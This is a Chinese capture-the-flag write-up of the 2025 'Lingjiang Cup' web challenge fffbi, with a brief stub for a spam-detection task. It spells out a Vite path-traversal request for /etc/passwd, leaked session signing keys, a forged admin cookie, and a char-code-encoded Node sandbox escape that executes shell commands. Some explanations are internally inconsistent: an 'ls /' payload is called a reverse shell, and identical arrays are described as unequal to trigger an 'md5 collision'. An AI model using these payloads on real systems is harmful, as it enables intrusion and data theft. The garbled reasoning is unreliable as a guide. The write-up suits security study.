---
title: 2025"领航杯"网安赛项学生组初赛 WP（中）- fffbi + 反垃圾
contest: 2025 领航杯网安赛项
year: 2025
difficulty: hard
vuln_type: [lfi, rce, ssrf, web_unknown, crypto_unknown]
tags: [领航杯 2025 学生组 fffbi, vite /@fs/app/vite/#/../../../../../../../../etc/passwd 目录穿越, nginx /etc/nginx/http.d/default.conf 代理转发, secretserver/ 内网应用 1337, cookieSession keys 数组, Object.freeze Object/Math, saferEval 沙箱逃逸, Math.constructor=Function, global.process.mainModule.constructor._load child_process execSync ls /, admin=1 改 PHPSESSION, 反垃圾]
attack_chain:
  - vite 开发服务器目录穿越：/@fs/app/vite/#/../../../../../../../../etc/passwd
  - 读 nginx 配置 /etc/nginx/http.d/default.conf
  - 找到 secretserver/ 代理转发到 127.0.0.1:1337
  - 读 secretserver 源码: keys=["a42f00ce4bc90b196681051aa150c79a","ca3e7eb9498281338233df353232c0fd"]
  - admin=1 改 PHPSESSION cookie 后台访问
  - Object.freeze(Object/Math) 但 Math.constructor=Function 不冻
  - saferEval 沙箱：/Math|[()+-*/&|^%<>=,?:]|\d+.?\d*(?:ed+)?| /g
  - 绕：Math.constructor=Function, Math.fromCharCode(...) child_process.execSync
  - ak=[0],sk=[0] 长度相同但不相等 + md5(ak+keys[0]) == md5(sk+keys[0]) 触发 md5 collision
  - 反垃圾：MIME/邮件 spam 检测
key_payload: "(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,...))()))(Math+1)"
one_liner: 2025 领航杯学生组 fffbi：vite 目录穿越 + nginx 代理发现 secretserver + Object.freeze 沙箱逃逸 + Math.constructor=Function 反弹 shell。
lesson: vite dev server /@fs/app/ 目录穿越是经典 0day；Object.freeze(Object/Math) 不能冻 .constructor；Math.constructor=Function 反弹 shell 是 NodeJS 沙箱逃逸标准套路。
quality: high
---

# 2025"领航杯"网安赛项学生组初赛 WP（中）

## Web: fffbi（4 星难度，无人解出）

### 解题步骤

**1. vite 开发服务器目录穿越**

```
GET /@fs/app/vite/#/../../../../../../../../etc/passwd
```

vite 默认 /@fs 路径可穿越读任意文件。

**2. 读 nginx 配置**

```
GET /@fs/app/vite/#/../../../etc/nginx/http.d/default.conf
```

**响应**：
```nginx
server {
    listen 80;
    server_name _;
    location / {
        proxy_pass http://127.0.0.1:5173;  # vite dev
    }
    location /secretserver/ {
        proxy_pass http://127.0.0.1:1337/;  # nodejs 应用
    }
}
```

发现 `/secretserver/` 代理到内网 1337 端口。

**3. 读 secretserver 源码**

```js
const keys = require('./key.js').keys;
// keys = ["a42f00ce4bc90b196681051aa150c79a", "ca3e7eb9498281338233df353232c0fd"]
```

**4. 改 PHPSESSION cookie 进后台**

```js
req.session.admin = 1;  // 服务端设
// 客户端伪造: PHPSESSION=eyJhZG1pbiI6MSwicmVzdWx0cyI6W119
// PHPSESSION.sig=5DYV8BNgDW4eD_OPi26KrqynHFQ  (cookieSession 签名)
```

**5. Object.freeze(Object/Math) 沙箱逃逸**

```js
Object.freeze(Object);
Object.freeze(Math);
```

但 **Math.constructor** 不冻 → 拿回 Function 构造器。

**6. saferEval 沙箱正则**

```js
if(str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+.?\d*(?:ed+)?)| /g, '')) {
    return null;
}
return eval(str);
```

**7. 反弹 shell payload**

```js
(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(
    114,101,116,117,114,110,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,
    46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,
    114,46,95,108,111,97,100,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,
    39,41,46,101,120,101,99,83,121,110,99,40,39,108,115,32,47,39,41,46,116,111,83,
    116,114,105,110,103,40,41))()))(Math+1)
```

→ `return global.process.mainModule.constructor._load('child_process').execSync('ls /').toString()`

**8. ak=sk md5 collision**

```json
{"e": "...", "ak": [0], "sk": [0]}
```

ak 和 sk 长度相同但不相等 + `md5(ak+keys[0]) == md5(sk+keys[0])`（已知 keys[0]） → md5 collision 触发。

## 02 Misc: 反垃圾

MIME/邮件 spam 检测（详细解法参考原文）。
